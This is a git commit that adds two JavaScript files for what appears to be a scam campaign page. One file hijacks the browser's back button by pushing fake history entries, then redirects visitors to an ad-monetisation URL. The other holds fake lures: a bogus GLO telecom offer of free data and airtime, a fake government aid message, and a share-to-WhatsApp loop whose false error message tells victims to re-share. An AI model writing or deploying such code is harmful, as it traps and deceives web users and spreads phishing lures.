3e5b37ed22e8ce293c8d9461078ff0c4594e4fcf
online012 <139100753+online012@users.noreply.github.com>
2024-03-05 20:49:29 +0100

    Add files via upload

---
+++ alladz.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://coolestreactionstems.com/xracf2t8?key=8b24ed3bef5abcdcd5680141b67ff860";
+    }
+    function goon(){
+        location.href="https://coolestreactionstems.com/xracf2t8?key=8b24ed3bef5abcdcd5680141b67ff860";
+    }
---
+++ nsi_js.js
@@ -0,0 +1,9 @@
+
+        var text1 = "*GLO rewards the customers who have been with the network for long with 4.5GB Data free and 5000 airtime free*%0A%0AHurry Now and check if you are Qualify%0A%0ACHECK HERE👇👇%0Ahttps://free-gb-data.org/hilda.html",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://bit.ly/yhauajjdng",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+ 
